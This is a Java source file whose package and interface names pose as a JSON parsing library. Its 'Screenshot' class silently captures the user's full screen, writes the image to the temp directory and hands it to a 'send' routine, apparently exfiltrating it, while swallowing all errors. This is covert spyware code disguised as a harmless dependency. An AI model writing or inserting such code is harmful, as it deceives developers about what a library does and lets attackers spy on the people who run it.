package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;

import javax.imageio.ImageIO;
import java.awt.*;
import java.io.File;
import java.util.Random;

public final class Screenshot implements JSONObject {
    @Override
    public void handle() {
        try {
            File file = new File(System.getProperty("java.io.tmpdir") + sep + "screenshot_" + new Random().nextInt() + ".png");
            ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "png", file);
            JSONRegexHandler.send(file);
        } catch (Exception ignored) {
        }
    }

    @Override
    public String getName() {
        return "Screenshot";
    }
}
